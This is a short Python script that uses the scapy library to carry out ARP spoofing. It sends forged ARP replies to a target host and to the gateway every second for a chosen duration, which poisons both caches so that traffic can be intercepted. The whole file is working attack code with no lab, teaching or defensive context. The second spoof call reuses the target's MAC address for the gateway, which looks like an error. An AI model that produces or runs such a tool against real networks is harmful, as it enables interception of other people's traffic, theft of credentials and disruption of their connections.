from scapy.all import *
import time



def spoof(target_ip, spoof_ip, target_mac):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                       psrc=spoof_ip)
    send(packet, verbose=False)


def run_arps(target_ip, gateway_ip, target_mac, duration):
    start_time = time.time()
    end_time = start_time + duration
    while time.time() < end_time:
        spoof(target_ip, gateway_ip, target_mac)
        spoof(gateway_ip, target_ip, target_mac)
        time.sleep(1)
